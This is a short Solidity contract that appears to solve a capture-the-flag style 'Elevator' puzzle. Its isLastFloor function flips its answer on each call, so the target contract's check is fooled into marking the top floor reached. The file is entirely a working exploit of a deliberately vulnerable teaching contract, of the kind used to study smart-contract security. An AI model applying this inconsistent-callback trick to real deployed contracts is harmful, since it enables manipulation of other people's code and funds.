// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./11-Elevator.sol";
import "hardhat/console.sol";

contract ElevatorAttack {

    Elevator public elevator;
    bool public oddCall = true;

    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(0);        
    }

    // as Elevator contract did not implement isLastFloor function,
    // we implement it here so that this version is used in the
    // context of elevator instance declared above
    function isLastFloor(uint) external returns (bool) {
        oddCall = !oddCall;
        return oddCall;
    }
}